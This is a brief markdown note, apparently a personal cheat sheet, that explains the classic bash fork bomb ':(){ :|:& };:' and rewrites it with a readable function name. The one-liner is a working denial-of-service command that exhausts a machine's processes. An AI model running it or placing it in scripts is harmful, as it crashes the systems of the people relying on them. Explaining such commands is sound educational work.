# Shell Fork Bomb

## Fork Bomd

- `:(){ :|:& };:`
  - This line keeps calling function to fork itself and blow up your machine
- Clear explanation

  ```bash
  my_function(){
      my_function | my_function&
  };
  my_function
  ```
